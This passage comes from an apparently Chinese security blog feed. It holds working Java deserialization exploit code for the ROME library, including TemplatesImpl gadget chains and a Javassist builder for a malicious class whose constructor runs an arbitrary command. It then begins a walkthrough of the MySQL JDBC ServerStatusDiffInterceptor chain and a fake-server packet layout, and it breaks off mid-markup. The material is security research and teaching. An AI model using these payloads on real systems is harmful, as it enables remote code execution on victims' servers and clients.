class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] evilCodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evil = &#123;evilCodes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//  EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(objectBean, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evil);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashtable);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc3.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc3.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="配合CC链"><a href="#配合CC链" class="headerlink" title="配合CC链"></a>配合CC链</h3><p>当然也可以使用CC中的任意方法调用来调用toString方法</p><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>JdbcRowSetImpl在FastJson中在&lt;&#x3D;1.2.24时使用的一个链子，这是针对后半段动态类加载不出网换成出网</p><h3 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h3><p>spring原生的toString利用链</p><h2 id="缩短Payload"><a href="#缩短Payload" class="headerlink" title="缩短Payload"></a>缩短Payload</h2><p>当payload长度被限制时, 即使最短的链条也无法成功执行, 因此需要进一步缩短</p><h3 id="使用Javassist缩短恶意class"><a href="#使用Javassist缩短恶意class" class="headerlink" title="使用Javassist缩短恶意class"></a>使用Javassist缩短恶意class</h3><blockquote><h4 id="Javassist："><a href="#Javassist：" class="headerlink" title="Javassist："></a>Javassist：</h4><p>Java 字节码以二进制的形式存储在 .class 文件中，每一个.class文件包含一个Java类或接口。Javaassist 就是一个用来处理Java字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象。其使用方式类似于反射。</p></blockquote><blockquote><h4 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h4><p>可以将其理解成加强版的Class对象，我们可以通过CtClass对目标类进行各种操作。可以<code>ClassPool.get(ClassName)</code>中获取。</p></blockquote><blockquote><h4 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h4><p><code>ClassPool</code>是<code>CtClass</code>对象的容器。<code>CtClass</code>对象必须从该对象获得。如果<code>get()</code>在此对象上调用，则它将搜索表示的各种源<code>ClassPath</code> 以查找类文件，然后创建一个<code>CtClass</code>表示该类文件的对象。创建的对象将返回给调用者。可以将其理解为一个存放<code>CtClass</code>对象的容器。</p><p>获得方法： <code>ClassPool cp = ClassPool.getDefault();</code>。通过 <code>ClassPool.getDefault()</code> 获取的 <code>ClassPool</code> 使用 JVM 的类搜索路径。<strong>如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类</strong>，因为Web服务器使用多个类加载器作为系统类加载器。在这种情况下，<strong>ClassPool 必须添加额外的类搜索路径</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(&lt;Class&gt;));</span><br></pre></td></tr></table></figure></blockquote><blockquote><h4 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h4><p>同理，可以理解成加强版的<code>Method</code>对象。可通过<code>CtClass.getDeclaredMethod(MethodName)</code>获取，该类提供了一些方法以便我们能够直接修改方法体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">CtMethod</span> <span class="keyword">extends</span> <span class="title class_">CtBehavior</span> &#123;</span><br><span class="line">    <span class="comment">// 主要的内容都在父类 CtBehavior 中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 父类 CtBehavior</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">CtBehavior</span> <span class="keyword">extends</span> <span class="title class_">CtMember</span> &#123;</span><br><span class="line">    <span class="comment">// 设置方法体</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBody</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入在方法体最前面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertBefore</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入在方法体最后面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertAfter</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在方法体的某一行插入内容</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertAt</span><span class="params">(<span class="type">int</span> lineNum, String src)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>feng师傅还介绍了几种对应的语言扩展：</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>$0,$1, $2, …</td><td>$0 &#x3D; this; $1 &#x3D; args[1] …..</td></tr><tr><td>$args</td><td>方法参数数组.它的类型为 Object[]</td></tr><tr><td>$$</td><td>所有实参。例如, m($$) 等价于 m(1,2,…)</td></tr><tr><td>$cflow(…)</td><td>cflow 变量</td></tr><tr><td>$r</td><td>返回结果的类型，用于强制类型转换</td></tr><tr><td>$w</td><td>包装器类型，用于强制类型转换</td></tr><tr><td>$_</td><td>返回值</td></tr><tr><td>$sig</td><td>类型为 java.lang.Class 的参数类型数组</td></tr><tr><td>$type</td><td>一个 java.lang.Class 对象，表示返回值类型</td></tr><tr><td>$class</td><td>一个 java.lang.Class 对象，表示当前正在修改的类</td></tr></tbody></table><p>关于<code>TemplatesImpl</code>这个类, 实际上不只是加载了字节码, 最终还对加载的类进行了实例化, 如图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821123921875.png" alt="image-20240821123921875"></p><p>因此可以把恶意代码放在构造器中</p><p>这样就可以简单生成一个恶意类, 这种直接生成字节码的方式跳过了编译阶段, 因此也不需要重写父类的方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetShellCode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> CtClass <span class="title function_">getTemplatesImpl</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            ctClass = pool.makeClass(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public A()&#123;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);\n&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(constructor);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ctClass;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotCompileException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WriteEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, IOException &#123;</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">shell</span> <span class="operator">=</span> GetShellCode.getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        shell.writeFile(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\JavaassitShellCode&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException &#123;</span><br><span class="line">        WriteEvilClass();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对比一下大小:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821125141207.png" alt="image-20240821125141207"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821125203492.png" alt="image-20240821125203492"></p><p>明显缩小了很多</p><p>直接把这个方法封装起来使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellCode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getEvilTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[][] evilbytes = &#123;getEvilClassCode(cmd, <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>)&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evilbytes);</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClassCode(String cmd, String superclass) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(superclass);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public A()&#123;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);\n&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(constructor);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception  e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样写exp也简化了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/12768">https://xz.aliyun.com/t/12768</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;什么是ROME&quot;&gt;&lt;a href=&quot;#什么是ROME&quot; class=&quot;headerlink&quot; title=&quot;什么是ROME&quot;&gt;&lt;/a&gt;什么是ROME&lt;/h2&gt;&lt;p&gt;简单来说, ROME工具库实现Java对象和XML数据之间的转换&lt;/p&gt;
&lt;h2 id=&quot;环境依赖&quot;</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="ROME反序列化" scheme="http://example.com/tags/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>JDBC反序列化</title>
    <link href="http://example.com/2024/08/19/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/08/19/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-08-19T12:19:10.000Z</published>
    <updated>2024-08-20T07:28:33.039Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JDBC基础"><a href="#JDBC基础" class="headerlink" title="JDBC基础"></a>JDBC基础</h2><p>参考</p><p><a href="https://liaoxuefeng.com/books/java/jdbc/basic/">https://liaoxuefeng.com/books/java/jdbc/basic/</a></p><p>浅尝一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>数据库版本为 8.0.12</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jdbcDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/learnjdbc?useSSL=false&amp;characterEncoding=utf8&amp;serverTimezone=GMT&quot;</span>; <span class="comment">// 这里加上serverTimezone=GMT 不然会报错</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> <span class="string">&quot;learn&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;learnpassword&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password)) &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;SELECT id, grade, name, gender FROM students WHERE gender=? AND grade=?&quot;</span>))&#123;</span><br><span class="line">                ps.setObject(<span class="number">1</span>, <span class="string">&quot;M&quot;</span>);</span><br><span class="line">                ps.setObject(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> ps.executeQuery())&#123;</span><br><span class="line">                    <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                        <span class="type">long</span> <span class="variable">id</span> <span class="operator">=</span> rs.getLong(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">                        <span class="type">long</span> <span class="variable">grade</span> <span class="operator">=</span> rs.getLong(<span class="string">&quot;grade&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;gender&quot;</span>);</span><br><span class="line">                        System.out.println(String.format(<span class="string">&quot;%d %d %s %s&quot;</span>, id, grade, name, gender));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JDBC反序列化"><a href="#JDBC反序列化" class="headerlink" title="JDBC反序列化"></a>JDBC反序列化</h2><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>首先看一下链子是怎么来的</p><p>原作者在<code>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()</code>中发现了一个反序列化的入口</p><p>再找调用了<code>getObject</code>的地方</p><p>在 <code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rs = stmt.executeQuery(<span class="string">&quot;SHOW SESSION STATUS&quot;</span>);            ResultSetUtil.resultSetToMap(toPopulate, rs);</span><br></pre></td></tr></table></figure><p>resultSetToMap中调用了readObject</p><p><code>ServerStatusDiffInterceptor</code>是一个拦截器，在JDBC URL中设定属性queryInterceptors为<code>ServerStatusDiffInterceptor</code>时，执行查询语句会调用拦截器的preProcess和postProcess方法, 而<code>preProcess</code>和<code>postProcess</code>又调用了<code>populateMapWithSessionStatusValues</code>, 进而最终触发readObject</p><p>有点乱, 上图:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820140216574.png" alt="image-20240820140216574"></p><p>问题就出在数据库查询<code>SHOW SESSION STATUS</code>返回的rs未经过验证进行反序列化, 造成了一个服务端打客户端的反序列化漏洞</p><p>因此, 下一步是伪造一个mysql数据库返回恶意数据</p><h3 id="伪造mysql服务器"><a href="#伪造mysql服务器" class="headerlink" title="伪造mysql服务器"></a>伪造mysql服务器</h3><p>wireshark抓本地回环的包, 过滤出mysql的数据包</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820140601889.png" alt="image-20240820140601889"></p><p>简单理解一下原理</p><p>以下内容来自 <a href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p><p>No.1699是一个问候报文, </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820142021243.png" alt="image-20240820142021243"></p><p>直接发送即可</p><p>之后客户端尝试连接数据库, 服务端返回Respone OK, 即 No.1716</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820142206566.png" alt="image-20240820142206566"></p><p>也是直接发送即可</p><p>之后是编写 <code>show session status</code>的响应包</p><blockquote><p><code>show session status</code>属于<strong>request Query</strong> 报文。对于查询数据包的响应包可以分为四种：错误包（ERR Packet）、正确包（OK Packet）、 Protocol::LOCAL_INFILE_Request、结果集（ProtocolText::Resultset）。我们上面看到的<strong>Response OK</strong>数据包就是<strong>OK packet</strong>。</p></blockquote><p>一个结果集响应包的结构。</p><ul><li>数据段1：说明下面的结果集有多少列</li><li>数据段2：列的定义</li><li>数据段3： EOF 包</li><li>数据段4：行数据。</li></ul><h4 id="数据段1"><a href="#数据段1" class="headerlink" title="数据段1"></a>数据段1</h4><p><code>01 00 00 01 02</code> 前三字节表示数据长度为1，sequence id为1，最后一字节02表示有两列</p><h4 id="数据段2"><a href="#数据段2" class="headerlink" title="数据段2"></a>数据段2</h4><p><code>1a000002036465660001630163016301630c3f00ffff0000fcffff000000</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1a 00 00  //3字节表示长度（这个长度说的是协议的内容长度，不包括序号那一字节）</span><br><span class="line">02      //序号 因为是第二个数据字段</span><br><span class="line">03646566  // 这个就是def的意思。</span><br><span class="line">00   //schema 协议因为不使用就用00</span><br><span class="line">01 63  //table 因为我们使用列数据，就不需要名字了，下面几个都是任意字符。字符串第一字节是用来说明长度的。</span><br><span class="line">01 63  //org_table  01表示1字节，63是数据</span><br><span class="line">0163    //name  </span><br><span class="line">0163   //org_name</span><br><span class="line">0c      filler  // length of the following fields 总是0x0c</span><br><span class="line">3f00   //characterset  字符编码 003f是binary </span><br><span class="line">ffff0000  column_length //允许数据最大长度，就是我们行数据的最大长度。ffff</span><br><span class="line">fc    //column_type 这一列数据类型  fc表示blob  </span><br><span class="line">9000    //flags  9000用的官方的 poc可以运行。  看fnmsd的要大于128好像。</span><br><span class="line">00          //decimals</span><br><span class="line">0000        //filler_2</span><br></pre></td></tr></table></figure><h4 id="数据段3"><a href="#数据段3" class="headerlink" title="数据段3"></a>数据段3</h4><p>EOF包</p><h4 id="数据段4"><a 